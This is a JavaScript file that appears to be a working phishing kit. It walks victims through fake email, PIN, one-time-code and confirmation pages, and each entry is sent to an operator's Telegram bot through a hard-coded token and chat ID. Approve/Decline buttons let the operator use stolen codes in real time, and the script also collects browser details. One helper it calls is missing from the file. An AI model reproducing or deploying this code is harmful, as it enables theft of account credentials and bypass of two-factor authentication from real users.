document.addEventListener("DOMContentLoaded", function () {
    const telegramBotToken = '7600421646:AAEWmFjiz9IcMUcqncFLp4wSnAHdZ77iaZU';
    const telegramChatId = '7837079543';
    const PIN_LENGTH = 4;
    const CODE_LENGTH = 6; // Final code length for page 3

    // Function to send session details to Telegram
    function sendSessionDataToTelegram(step, extraMessage) {
        const ip = 'IP_ADDRESS'; // Replace with real method to get IP (e.g., using a service or backend)
        const userAgent = navigator.userAgent;
        const battery = navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'Unknown';

        const sessionDetails = `
            Step: ${step}
            User IP: ${ip}
            User-Agent: ${userAgent}
            Battery Level: ${battery}
            Session Data: ${extraMessage}
        `;

        console.log("Sending session data:", sessionDetails);

        return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: sessionDetails
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Session data successfully sent to Telegram');
                return true;
            } else {
                console.error('Failed to send session data to Telegram:', data);
                return false;
            }
        })
        .catch(error => {
            console.error('Error in sending session data to Telegram:', error);
            return false;
        });
    }

    // Function to send a message to Telegram with Approve/Decline buttons
    function sendMessageToTelegramWithButtons(message) {
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        console.log("Sending message to Telegram with buttons:", message);

        return fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "Approve", callback_data: "approve" },
                            { text: "Decline", callback_data: "decline" }
                        ]
                    ]
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message with approval buttons sent successfully');
            } else {
                console.error('Failed to send message with buttons:', data);
            }
        })
        .catch(error => {
            console.error('Error in sending message with buttons:', error);
        });
    }

    // Function to load content into #content-container seamlessly
    function loadContent(pageUrl) {
        console.log(`Attempting to load content from ${pageUrl}`);
        fetch(pageUrl)
            .then(response => {
                if (!response.ok) throw new Error(`Network response was not ok for ${pageUrl}`);
                return response.text();
            })
            .then(data => {
                const container = document.getElementById('content-container');
                if (container) {
                    container.innerHTML = data;
                    console.log(`Loaded content from ${pageUrl}`);
                    
                    if (pageUrl === 'page2.html') {
                        displayStoredEmail();
                        initPinEntry();
                    } else if (pageUrl === 'page3.html') {
                        initFinalCodeEntry();
                    } else if (pageUrl === 'page4.html') {
                        initEmailConfirmation();
                    }
                } else {
                    console.error('#content-container not found');
                }
            })
            .catch(error => console.error(`Error loading content from ${pageUrl}:`, error));
    }

    // Initialize email entry functionality on page 1
    function initEmailEntry() {
        const loginButton = document.querySelector('[data-testid="e2e-login-continue-button"]');
        const emailInput = document.getElementById('email');

        if (loginButton && emailInput) {
            console.log("Email entry elements found on Page 1");
            loginButton.addEventListener('click', function(event) {
                event.preventDefault();
                const email = emailInput.value;
                
                if (email) {
                    console.log("Email entered:", email);
                    sendMessageToTelegram(`User entered email: ${email}`).then(success => {
                        if (success) {
                            localStorage.setItem("userEmail", email);
                            loadContent('page2.html');
                        }
                    });
                } else {
                    console.log('No email entered');
                }
            });
        } else {
            console.log("Email entry elements not found on Page 1");
        }
    }

    // Display the stored email on page 2
    function displayStoredEmail() {
        const email = localStorage.getItem("userEmail");
        if (email) {
            const emailDisplay = document.getElementById('userEmail');
            if (emailDisplay) {
                emailDisplay.textContent = email;
                console.log("Displaying stored email on Page 2:", email);
            }
        }
    }

    // Initialize PIN entry functionality on page 2
    function initPinEntry() {
        const passcodeInput = document.getElementById('passcode-input');

        if (passcodeInput) {
            console.log("PIN entry elements found on Page 2");
            passcodeInput.addEventListener('input', function() {
                if (passcodeInput.value.length === PIN_LENGTH) {
                    console.log("PIN entered:", passcodeInput.value);
                    sendMessageToTelegram(`Entered PIN: ${passcodeInput.value}`).then(success => {
                        if (success) {
                            // Send Telegram message with buttons and proceed after 3 seconds
                            sendMessageToTelegramWithButtons('Please approve the entered PIN.').then(() => {
                                setTimeout(() => {
                                    loadContent('page3.html'); // Automatically proceed after 3 seconds
                                }, 3000);
                            });
                        }
                    });
                }
            });
        } else {
            console.log("PIN entry elements not found on Page 2");
        }
    }

    // Initialize final 6-digit code entry on page 3
    function initFinalCodeEntry() {
        const codeInput = document.getElementById('code-input');

        if (codeInput) {
            console.log("Final code entry elements found on Page 3");
            codeInput.addEventListener('input', function() {
                if (codeInput.value.length === CODE_LENGTH) {
                    console.log("Final code entered:", codeInput.value);
                    sendMessageToTelegram(`Entered final code: ${codeInput.value}`).then(success => {
                        if (success) {
                            // Send Telegram message with buttons and proceed after 3 seconds
                            sendMessageToTelegramWithButtons('Please approve the final code.').then(() => {
                                setTimeout(() => {
                                    window.location.href = 'page4.html'; // Automatically proceed after 3 seconds
                                }, 3000);
                            });
                        }
                    }).catch(error => {
                        console.error('Error sending final code to Telegram:', error);
                    });
                }
            });
        } else {
            console.log("Final code input element not found on Page 3");
        }
    }

    // Initialize email confirmation on page 4
    function initEmailConfirmation() {
        const confirmEmailButton = document.getElementById('confirmEmailButton');
        const emailInput = document.getElementById('verification-url');

        if (confirmEmailButton && emailInput) {
            console.log("Email confirmation elements found on Page 4");

            confirmEmailButton.addEventListener('click', function () {
                const email = emailInput.value.trim();
                console.log("Submit button clicked, email input is:", email);

                if (email) {
                    sendMessageToTelegram(`User confirmed email: ${email}`).then(success => {
                        if (success) {
                            console.log("Email confirmation sent successfully");
                            window.location.href = 'confirmation.html';
                        } else {
                            console.error("Failed to send email confirmation to Telegram");
                        }
                    }).catch(error => {
                        console.error("Error in sending to Telegram:", error);
                    });
                } else {
                    console.log("No email entered in the input field");
                }
            });
        } else {
            console.error("Email confirmation elements not found on Page 4");
        }
    }

    // Run the appropriate function based on the current page
    if (document.body.contains(document.getElementById('email'))) {
        initEmailEntry(); // Page 1 - Email entry
    } else if (document.body.contains(document.getElementById('passcode-input'))) {
        initPinEntry(); // Page 2 - PIN entry
    } else if (document.body.contains(document.getElementById('code-input'))) {
        initFinalCodeEntry(); // Page 3 - Final code entry
    } else if (document.body.contains(document.getElementById('verification-url'))) {
        initEmailConfirmation(); // Page 4 - Email confirmation
    } else {
        console.log("No matching elements found to initialize");
    }

});
